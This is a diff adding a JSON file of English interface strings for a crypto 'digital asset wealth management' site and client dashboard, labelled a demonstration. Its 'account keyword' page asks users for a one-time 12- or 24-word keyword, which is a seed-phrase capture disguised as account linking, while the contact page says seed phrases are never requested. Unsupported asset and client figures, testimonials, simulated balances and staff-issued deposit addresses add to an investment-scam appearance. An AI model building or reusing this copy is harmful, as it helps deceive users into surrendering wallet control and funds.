@@ -1,0 +1,619 @@
+{
+  "meta": {
+    "title": "Digital Wealth Partners — Digital Asset Wealth Management",
+    "description": "Institutional-grade custody and multi-currency crypto portfolio management for private clients.",
+    "ogTitle": "Digital Wealth Partners",
+    "ogDescription": "Institutional-grade digital asset custody and portfolio management."
+  },
+  "nav": {
+    "home": "Home",
+    "about": "About",
+    "services": "How it works",
+    "security": "Security",
+    "faq": "FAQ",
+    "contact": "Contact",
+    "mainLabel": "Main",
+    "openMenu": "Open menu",
+    "closeMenu": "Close menu",
+    "myPortfolio": "My portfolio",
+    "adminPanel": "Admin panel",
+    "logIn": "Log in",
+    "openAccount": "Open an account"
+  },
+  "language": {
+    "label": "Language",
+    "change": "Change language"
+  },
+  "footer": {
+    "tagline": "Institutional-grade custody and portfolio management for digital assets, built for private clients and family offices.",
+    "supportedAssets": "Supported assets: {assets}",
+    "company": "Company",
+    "about": "About",
+    "howItWorks": "How it works",
+    "securityCompliance": "Security & compliance",
+    "faq": "FAQ",
+    "clientAccess": "Client access",
+    "logIn": "Log in",
+    "openAccount": "Open an account",
+    "contactUs": "Contact us",
+    "riskDisclaimer": "<strong>Risk disclaimer.</strong> Digital asset prices are highly volatile and may result in the total loss of capital. Nothing on this site constitutes financial, investment, legal or tax advice, or an offer or solicitation to buy or sell any asset. Past performance is not indicative of future results. You should obtain independent professional advice before transacting.",
+    "copyright": "© {year} Digital Wealth Partners. Demonstration environment."
+  },
+  "about": {
+    "meta": {
+      "title": "About — Digital Wealth Partners",
+      "description": "Who we are: a digital asset wealth manager built by private banking, custody and compliance professionals.",
+      "ogDescription": "A digital asset wealth manager built by private banking and custody professionals."
+    },
+    "eyebrow": "About us",
+    "title": "Built for clients who expect custody to be boring",
+    "description": "Digital Wealth Partners was founded on a simple premise: digital assets deserve the same operational discipline as any other part of a serious portfolio.",
+    "storyHeading": "Our story",
+    "story1": "[PLACEHOLDER COPY] We started in 2019 after watching clients hold significant digital asset positions across a patchwork of exchange accounts, hardware wallets and spreadsheets — with no consolidated view and no credible custody story.",
+    "story2": "Today we administer multi-currency accounts for private clients, family offices and independent advisors, combining institutional custody practice with reporting that fits into existing wealth structures.",
+    "story3": "We are deliberately conservative. We support a small set of liquid assets, we document every balance movement, and we would rather decline a mandate than stretch our controls.",
+    "pillars": {
+      "mission": {
+        "title": "Our mission",
+        "body": "Give clients one verified, well-controlled home for their digital assets, with reporting they can hand to an auditor."
+      },
+      "principles": {
+        "title": "Our principles",
+        "body": "Custody before yield. Documentation before growth. Clear fees, no hidden spreads, no product we cannot explain in one page."
+      },
+      "clients": {
+        "title": "Who we serve",
+        "body": "Private clients, family offices and advisors who need consolidated digital asset positions alongside traditional holdings."
+      }
+    },
+    "leadership": "Leadership",
+    "leadershipNote": "Team details below are placeholders for the demonstration build.",
+    "team": {
+      "ceo": {
+        "name": "[Placeholder] Elena Marsh",
+        "role": "Chief Executive Officer",
+        "bio": "Two decades in private banking and discretionary portfolio management."
+      },
+      "cco": {
+        "name": "[Placeholder] Daniel Osei",
+        "role": "Chief Compliance Officer",
+        "bio": "Former AML lead at a tier-one custodian; oversees KYC and sanctions screening."
+      },
+      "custody": {
+        "name": "[Placeholder] Priya Raghunath",
+        "role": "Head of Custody Operations",
+        "bio": "Designs key management, cold storage and multi-approval withdrawal controls."
+      },
+      "reporting": {
+        "name": "[Placeholder] Tomas Berg",
+        "role": "Head of Client Reporting",
+        "bio": "Builds the statements, valuations and tax-ready exports clients rely on."
+      }
+    }
+  },
+  "security": {
+    "meta": {
+      "title": "Security & Compliance — Digital Wealth Partners",
+      "description": "Cold storage, two-factor authentication, multi-approval withdrawals, KYC/AML programme and regulatory disclosures.",
+      "ogDescription": "Cold storage, 2FA, multi-approval withdrawals and our KYC/AML programme."
+    },
+    "eyebrow": "Security & compliance",
+    "title": "Controls you can put in front of an auditor",
+    "description": "Our security posture is designed around a single question: what happens if any one person, device or vendor is compromised?",
+    "controlsHeading": "Operational controls",
+    "controls": {
+      "coldStorage": {
+        "title": "Cold storage by default",
+        "body": "The majority of client assets are held offline in geographically distributed storage with tamper-evident key ceremonies. [Placeholder ratio: 97.5% cold / 2.5% operational.]"
+      },
+      "keyManagement": {
+        "title": "Multi-party key management",
+        "body": "Signing keys are split across independent custodians. No single individual can construct a valid outbound transaction."
+      },
+      "twoFactor": {
+        "title": "Two-factor authentication",
+        "body": "Time-based one-time passcodes are supported on every client account and can be enforced for withdrawals."
+      },
+      "identity": {
+        "title": "Identity verification",
+        "body": "Every account completes KYC before transacting: legal name, date of birth, residency and a government-issued identity document."
+      },
+      "monitoring": {
+        "title": "Transaction monitoring",
+        "body": "Deposits and withdrawals are screened against sanctions and high-risk address lists before settlement."
+      },
+      "records": {
+        "title": "Auditable records",
+        "body": "Every balance change writes an immutable ledger entry showing type, amount, actor and timestamp."
+      }
+    },
+    "amlHeading": "KYC / AML statement",
+    "aml1": "Digital Wealth Partners operates a risk-based anti-money-laundering programme. Before an account may transact, we verify the client's identity, confirm country of residence, screen against applicable sanctions and politically-exposed-person lists, and record the source of funds where thresholds require it.",
+    "aml2": "We retain verification records for the period required by applicable law and re-verify accounts periodically or on a material change in circumstances. We file reports with the relevant authorities where we are obliged to do so, and we may freeze or close an account pending review without prior notice.",
+    "aml3": "Verification statuses used in this platform are <pending></pending>, <verified></verified> and <rejected></rejected>. Accounts may explore the dashboard while pending, but funding and withdrawals are enabled only after verification in a production configuration.",
+    "statusPending": "pending",
+    "statusVerified": "verified",
+    "statusRejected": "rejected",
+    "disclaimerHeading": "Regulatory disclaimer",
+    "disclaimer1": "Digital Wealth Partners is a demonstration entity and is not currently licensed, registered or authorised by any financial regulator. Nothing on this site is an offer, solicitation or recommendation to buy, sell or hold any digital asset.",
+    "disclaimer2": "Digital assets are volatile, are generally not covered by deposit-insurance or investor-compensation schemes, and may lose all value. Balances, prices, conversion rates and performance figures in this environment are simulated and must not be relied upon."
+  },
+  "faq": {
+    "meta": {
+      "title": "Frequently Asked Questions — Digital Wealth Partners",
+      "description": "Answers on custody, verification, deposits, withdrawals, fees, supported assets and account security.",
+      "ogDescription": "Custody, verification, deposits, withdrawals, fees and account security explained."
+    },
+    "eyebrow": "FAQ",
+    "title": "Questions clients ask before funding",
+    "description": "If your question is not answered here, our client team will respond within one business day.",
+    "questions": {
+      "custody": {
+        "q": "Who holds my assets?",
+        "a": "Assets are held in segregated wallet structures administered by Digital Wealth Partners. Your account ledger records your entitlement per asset, and every movement is recorded with a timestamp and reason."
+      },
+      "verification": {
+        "q": "How long does verification take?",
+        "a": "Most identity checks are reviewed within one business day. You can explore your dashboard while your verification is pending; a banner will show your current status."
+      },
+      "deposit": {
+        "q": "How do I deposit?",
+        "a": "Choose the asset in your dashboard, copy the deposit address shown for that network, send your funds, then confirm the transfer. Operations reconcile the deposit and credit your wallet."
+      },
+      "withdrawal": {
+        "q": "How do withdrawals work?",
+        "a": "Submit a destination address and amount. The request is screened and approved before settlement. You will see it as pending in your transaction history until it is completed."
+      },
+      "assets": {
+        "q": "Which assets do you support?",
+        "a": "The assets listed in your dashboard. We deliberately support a small set of liquid assets rather than a long tail, and the list is maintained by our desk."
+      },
+      "fees": {
+        "q": "What do you charge?",
+        "a": "A placeholder 0.55% annual administration fee, network cost plus 0.10% on withdrawals, and 0.35% on conversions. See the fee schedule for the full list."
+      },
+      "live": {
+        "q": "Is this environment live?",
+        "a": "No. This is a demonstration build. Balances, prices, deposit addresses and conversion rates are simulated, and no real funds or blockchain transactions are involved."
+      },
+      "twoFactor": {
+        "q": "Can I enable two-factor authentication?",
+        "a": "Yes — two-factor authentication is offered in your security settings and can be required for withdrawals."
+      }
+    },
+    "askTeam": "Ask our client team",
+    "openAccount": "Open an account"
+  },
+  "services": {
+    "meta": {
+      "title": "How It Works & Fees — Digital Wealth Partners",
+      "description": "Our custody model, deposit and withdrawal flow, supported networks and a clear placeholder fee schedule.",
+      "ogDescription": "Custody model, deposit flow, supported networks and fee schedule."
+    },
+    "eyebrow": "Services",
+    "title": "How your account works, end to end",
+    "description": "From verification to custody to withdrawal, here is exactly what happens to your assets and what it costs.",
+    "custodyHeading": "The custody model",
+    "custodyBody": "Client assets are recorded in segregated per-asset wallet ledgers. Each account receives a dedicated deposit address per supported network. Outbound movements require a client request, a compliance check and internal approval before settlement — no single operator can move client assets alone.",
+    "steps": {
+      "deposit": {
+        "title": "Deposit",
+        "body": "You request a deposit address for the asset, send funds on the correct network, and confirm the transfer in your dashboard."
+      },
+      "confirmation": {
+        "title": "Confirmation",
+        "body": "Operations reconcile the incoming transfer and credit your segregated wallet ledger. Your transaction history shows every state change."
+      },
+      "withdrawal": {
+        "title": "Withdrawal",
+        "body": "You submit a destination address and amount. The request is screened, approved and settled, then reflected in your balance."
+      }
+    },
+    "networksHeading": "Supported assets and networks",
+    "colAsset": "Asset",
+    "colNetwork": "Network",
+    "colMinimum": "Minimum deposit",
+    "colPrecision": "Precision",
+    "decimalPlaces": "{count} dp",
+    "feesHeading": "Fee schedule",
+    "feesNote": "All figures below are clearly-labelled placeholders for this demonstration build.",
+    "colItem": "Item",
+    "colRate": "Placeholder rate",
+    "colBasis": "Basis",
+    "fees": {
+      "administration": {
+        "item": "Account administration",
+        "rate": "0.55% per annum",
+        "basis": "Charged monthly on average balances"
+      },
+      "deposit": {
+        "item": "Deposit (on-chain)",
+        "rate": "No charge",
+        "basis": "Network fees paid by sender"
+      },
+      "withdrawal": {
+        "item": "Withdrawal (on-chain)",
+        "rate": "Network cost + 0.10%",
+        "basis": "Quoted before confirmation"
+      },
+      "conversion": {
+        "item": "Currency conversion",
+        "rate": "0.35% of notional",
+        "basis": "Applied to the simulated rate"
+      },
+      "statements": {
+        "item": "Statements & tax exports",
+        "rate": "Included",
+        "basis": "Unlimited downloads"
+      }
+    },
+    "openAccount": "Open an account"
+  },
+  "home": {
+    "meta": {
+      "title": "Digital Wealth Partners — Digital Asset Wealth Management",
+      "description": "Custody, portfolio reporting and multi-currency crypto accounts for private clients and family offices. Open an account in minutes.",
+      "ogDescription": "Custody, portfolio reporting and multi-currency crypto accounts for private clients and family offices."
+    },
+    "eyebrow": "Regulated-style custody model",
+    "heroTitle": "Digital asset wealth management, <gold>held to institutional standards</gold>",
+    "heroBody": "Digital Wealth Partners gives private clients a single, verified account for their digital assets — with segregated wallets, documented custody, and reporting your accountant will recognise.",
+    "openAccount": "Open an account",
+    "seeCustody": "See how custody works",
+    "placeholderFigure": "Placeholder figure",
+    "stats": {
+      "aua": {
+        "value": "$1.42B",
+        "label": "Assets under administration"
+      },
+      "clients": {
+        "value": "3,800+",
+        "label": "Private clients served"
+      },
+      "coldStorage": {
+        "value": "97.5%",
+        "label": "Assets in cold storage"
+      },
+      "support": {
+        "value": "< 4 hrs",
+        "label": "Client support response"
+      }
+    },
+    "assetsHeading": "Supported assets · indicative pricing (simulated)",
+    "onboarding": "Onboarding",
+    "stepsHeading": "Three steps to a funded account",
+    "stepLabel": "Step {number}",
+    "steps": {
+      "open": {
+        "title": "Open your account",
+        "body": "Register with your email, accept our client terms and confirm your address. Takes about three minutes."
+      },
+      "verify": {
+        "title": "Verify your identity",
+        "body": "Submit your legal name, date of birth, country of residence and an identity document for KYC/AML review."
+      },
+      "fund": {
+        "title": "Fund and manage",
+        "body": "Deposit into your segregated multi-currency wallets and track performance from a single reporting dashboard."
+      }
+    },
+    "trustHeading": "Custody discipline before returns",
+    "trustBody": "Client assets are held in segregated wallet structures with multi-party approval on every outbound movement. Our operating model is documented, auditable and reviewed on a fixed schedule.",
+    "trust": {
+      "cold": {
+        "title": "Cold-storage first",
+        "body": "The large majority of client assets sit in offline, geographically distributed storage."
+      },
+      "segregated": {
+        "title": "Segregated records",
+        "body": "Every client balance is tracked per asset with a complete adjustment history."
+      },
+      "kyc": {
+        "title": "KYC/AML on every account",
+        "body": "Identity verification and sanctions screening before an account can transact."
+      }
+    },
+    "readSecurity": "Read our security posture",
+    "testimonials": {
+      "family": {
+        "quote": "The reporting is the closest thing we've seen to our traditional custodian statements.",
+        "name": "A. Reinhardt",
+        "role": "Family office principal"
+      },
+      "private": {
+        "quote": "Onboarding and verification were handled with the discipline we expect from a private bank.",
+        "name": "M. Okonjo",
+        "role": "Private client"
+      },
+      "advisor": {
+        "quote": "Clear fees, clear custody model, and a team that answers the phone.",
+        "name": "S. Whitfield",
+        "role": "Independent advisor"
+      }
+    },
+    "ctaTitle": "Ready to consolidate your digital assets?",
+    "ctaBody": "Open an account, complete verification, and fund your wallets. No minimum for the demonstration environment.",
+    "getStarted": "Get started"
+  },
+  "common": {
+    "transactionTypes": {
+      "deposit": "Deposit",
+      "withdrawal": "Withdrawal",
+      "admin_adjustment": "Adjustment",
+      "convert": "Conversion"
+    },
+    "statuses": {
+      "pending": "Pending",
+      "completed": "Completed",
+      "rejected": "Rejected",
+      "verified": "Verified"
+    }
+  },
+  "contact": {
+    "meta": {
+      "title": "Contact — Digital Wealth Partners",
+      "description": "Talk to our client team about onboarding, custody or reporting. We respond within one business day.",
+      "ogDescription": "Talk to our client team about onboarding, custody or reporting."
+    },
+    "eyebrow": "Contact",
+    "title": "Talk to our client team",
+    "description": "Questions about onboarding, custody or reporting? Send us a note and we will respond within one business day.",
+    "formHeading": "Send a message",
+    "fullName": "Full name",
+    "email": "Email address",
+    "messageLabel": "How can we help?",
+    "send": "Send message",
+    "sending": "Sending…",
+    "sentTitle": "Message received",
+    "sentBody": "Thank you — a member of the client team will be in touch shortly.",
+    "sendAnother": "Send another message",
+    "errors": {
+      "nameMin": "Please enter your full name",
+      "nameMax": "Name must be under 100 characters",
+      "emailInvalid": "Enter a valid email address",
+      "emailMax": "Email must be under 255 characters",
+      "messageMin": "Please give us at least 10 characters",
+      "messageMax": "Message must be under 2000 characters"
+    },
+    "toastSuccess": "Message sent. Our client team will reply within one business day.",
+    "toastError": "We could not send your message. Please try again.",
+    "cards": {
+      "email": "Email",
+      "phone": "Client line",
+      "office": "Registered office"
+    },
+    "credentialWarning": "Please do not send account credentials, seed phrases or private keys. We will never ask for them."
+  },
+  "auth": {
+    "meta": {
+      "title": "Client Login & Account Opening — Digital Wealth Partners",
+      "description": "Log in to your Digital Wealth Partners portfolio or open a new multi-currency digital asset account.",
+      "ogDescription": "Log in to your portfolio or open a new digital asset account."
+    },
+    "backToSite": "Back to site",
+    "signupTitle": "Open your account",
+    "loginTitle": "Client login",
+    "signupSubtitle": "Registration takes about three minutes. Identity verification follows.",
+    "loginSubtitle": "Access your portfolio, wallets and statements.",
+    "fullLegalName": "Full legal name",
+    "email": "Email address",
+    "password": "Password",
+    "forgotPassword": "Forgot password?",
+    "terms": "I accept the client terms of business and privacy policy, and I understand digital assets are volatile and may lose value.",
+    "pleaseWait": "Please wait…",
+    "createAccount": "Create account",
+    "logIn": "Log in",
+    "openAccount": "Open an account",
+    "alreadyClient": "Already a client?",
+    "newHere": "New to Digital Wealth Partners?",
+    "verifyEmailTitle": "Verify your email",
+    "verifyEmailBody": "We sent a confirmation link to <email></email>. Click it to activate your account, then log in to complete identity verification.",
+    "goToLogin": "Go to login",
+    "errors": {
+      "emailInvalid": "Enter a valid email address",
+      "passwordMin": "Use at least 8 characters",
+      "passwordMax": "Password must be under 72 characters",
+      "fullNameRequired": "Please enter your full legal name",
+      "termsRequired": "You must accept the client terms and privacy policy"
+    },
+    "toast": {
+      "accountCreated": "Account created.",
+      "welcomeBack": "Welcome back.",
+      "failed": "Authentication failed"
+    }
+  },
+  "forgotPassword": {
+    "meta": {
+      "title": "Reset Your Password — Digital Wealth Partners",
+      "description": "Request a secure password reset link for your Digital Wealth Partners client account.",
+      "ogDescription": "Request a secure password reset link."
+    },
+    "title": "Forgot your password?",
+    "subtitle": "Enter your account email and we will send you a reset link.",
+    "email": "Email address",
+    "submit": "Send reset link",
+    "sending": "Sending…",
+    "backToLogin": "Back to login",
+    "sentTitle": "Check your inbox",
+    "sentBody": "If an account exists for <email></email>, we have sent a password reset link. It expires in 60 minutes.",
+    "errorInvalidEmail": "Enter a valid email address",
+    "toastError": "Could not send reset link"
+  },
+  "resetPassword": {
+    "meta": {
+      "title": "Set a New Password — Digital Wealth Partners",
+      "description": "Choose a new password for your Digital Wealth Partners client account.",
+      "ogDescription": "Choose a new password for your client account."
+    },
+    "title": "Set a new password",
+    "subtitle": "Open this page from the reset link in your email. Choose a password of at least 8 characters.",
+    "newPassword": "New password",
+    "confirmPassword": "Confirm new password",
+    "submit": "Update password",
+    "updating": "Updating…",
+    "backToLogin": "Back to login",
+    "errors": {
+      "passwordMin": "Use at least 8 characters",
+      "mismatch": "Passwords do not match"
+    },
+    "toast": {
+      "invalidLink": "This reset link is invalid or has expired. Request a new one.",
+      "success": "Password updated. You are now signed in.",
+      "error": "Could not update password"
+    }
+  },
+  "dashboard": {
+    "navLabel": "Dashboard",
+    "nav": {
+      "overview": "Overview",
+      "wallets": "Wallets",
+      "transactions": "Transactions",
+      "kyc": "Verification",
+      "accountKeyword": "Account keyword",
+      "settings": "Profile & settings"
+    },
+    "signOut": "Sign out",
+    "kycPending": "Identity verification is pending. You can explore your account while we review it.",
+    "kycRejected": "Your identity verification was not accepted. Please resubmit your details.",
+    "goToVerification": "Go to verification"
+  },
+  "overview": {
+    "title": "Portfolio overview",
+    "subtitle": "Valuations use live market prices, refreshed continuously.",
+    "totalValue": "Total value",
+    "change24h": "{percent} · 24h",
+    "pricesAsOf": "Prices as of {time}",
+    "allocation": "Allocation",
+    "noHoldings": "No holdings yet. <link>Fund your first wallet</link>.",
+    "recentActivity": "Recent activity",
+    "viewAll": "View all",
+    "noActivity": "No activity yet. Deposits, withdrawals and adjustments will appear here."
+  },
+  "wallets": {
+    "title": "Wallets",
+    "subtitle": "Balances are simulated and administered internally in this demonstration build.",
+    "delisted": "No longer accepting deposits. You can still withdraw this balance.",
+    "deposit": "Deposit",
+    "withdraw": "Withdraw",
+    "depositTitle": "Deposit {code}",
+    "depositDescription": "Send only {code} on the {network} network to this address.",
+    "networkFallback": "published",
+    "noAddress": "No {code} deposit address has been published yet. Please contact your relationship team, or try again shortly.",
+    "qrAlt": "QR code for the {code} deposit address",
+    "addressLabel": "Your deposit address",
+    "copyAddress": "Copy deposit address",
+    "addressCopied": "Address copied",
+    "depositWarning": "Send only {code}. Sending another asset or using a different network will result in permanent loss. This is a simulated address for demonstration purposes.",
+    "depositWarningWithNetwork": "Send only {code} on the {network} network. Sending another asset or using a different network will result in permanent loss. This is a simulated address for demonstration purposes.",
+    "amountSent": "Amount sent",
+    "amountSentError": "Enter the amount you sent",
+    "cancel": "Cancel",
+    "submitting": "Submitting…",
+    "confirmDeposit": "I've sent my deposit",
+    "depositSubmitted": "Deposit submitted for confirmation.",
+    "depositError": "Could not submit deposit",
+    "withdrawTitle": "Withdraw {code}",
+    "confirmWithdrawalTitle": "Confirm withdrawal",
+    "confirmWithdrawalDescription": "Check these details carefully. Withdrawals cannot be reversed once settled.",
+    "available": "Available: {amount} {code}",
+    "asset": "Asset",
+    "amount": "Amount",
+    "value": "Value",
+    "destination": "Destination",
+    "destinationAddress": "Destination address",
+    "errors": {
+      "address": "Enter a valid destination address",
+      "amountPositive": "Enter an amount greater than zero",
+      "amountExceeds": "Amount exceeds your available balance"
+    },
+    "back": "Back",
+    "reviewRequest": "Review request",
+    "confirmRequest": "Confirm request",
+    "withdrawalSubmitted": "Withdrawal request submitted for review.",
+    "withdrawalError": "Could not submit request",
+    "convertHeading": "Convert",
+    "convertSubtitle": "Simulated instant conversion between held assets at mock rates.",
+    "from": "From",
+    "to": "To",
+    "convert": "Convert",
+    "converting": "Converting…",
+    "convertResult": "You receive ≈ {receive} {to} · 1 {from} = {rate} {to}",
+    "convertSuccess": "Converted to {amount} {code} at the simulated rate.",
+    "convertError": "Conversion failed"
+  },
+  "transactions": {
+    "title": "Transaction history",
+    "subtitle": "Every deposit, withdrawal, adjustment and conversion on your account.",
+    "type": "Type",
+    "status": "Status",
+    "fromDate": "From date",
+    "allTypes": "All types",
+    "allStatuses": "All statuses",
+    "noResults": "No transactions match these filters.",
+    "colDate": "Date",
+    "colType": "Type",
+    "colAsset": "Asset",
+    "colAmount": "Amount",
+    "colValue": "Value",
+    "colStatus": "Status"
+  },
+  "kyc": {
+    "title": "Identity verification",
+    "subtitle": "Required by our KYC/AML programme before your account can transact.",
+    "currentStatus": "Current status",
+    "fullLegalName": "Full legal name",
+    "dob": "Date of birth",
+    "country": "Country of residence",
+    "document": "Identity document",
+    "documentHint": "Passport or national ID. Only file metadata and the stored path are recorded.",
+    "submit": "Submit for verification",
+    "submitting": "Submitting…",
+    "errors": {
+      "fullName": "Enter your full legal name",
+      "dob": "Enter your date of birth",
+      "country": "Enter your country of residence"
+    },
+    "toast": {
+      "success": "Verification submitted. We will review it within one business day.",
+      "error": "Submission failed"
+    }
+  },
+  "accountKeyword": {
+    "title": "Account keyword",
+    "subtitle": "Enter the unique keyword you were issued for your account. It links your account to our records.",
+    "label": "Your account keyword",
+    "placeholder": "Enter your keyword",
+    "hint": "Usually 12 or 24 words.",
+    "wordCount": "{count} words",
+    "submit": "Save keyword",
+    "submitting": "Saving…",
+    "lockedTitle": "Your account keyword is set",
+    "lockedNote": "For your security, this keyword can only be set once. Contact support if it needs to change.",
+    "setOn": "Set on {date}",
+    "toast": {
+      "success": "Account keyword saved.",
+      "error": "Could not save your keyword"
+    }
+  },
+  "settings": {
+    "title": "Profile & settings",
+    "subtitle": "Manage your contact details and account security.",
+    "contactDetails": "Contact details",
+    "email": "Email",
+    "fullName": "Full name",
+    "save": "Save changes",
+    "saving": "Saving…",
+    "security": "Security",
+    "securityBody": "We'll email you a secure link to choose a new password.",
+    "sendReset": "Send password reset link",
+    "sending": "Sending…",
+    "support": "Support",
+    "supportBody": "Your relationship team is available Monday to Friday, 08:00–18:00 UTC at <email></email>.",
+    "toast": {
+      "profileUpdated": "Profile updated.",
+      "profileError": "Update failed",
+      "resetSent": "Password reset link sent to your email.",
+      "resetError": "Could not send reset link"
+    }
+  }
+}
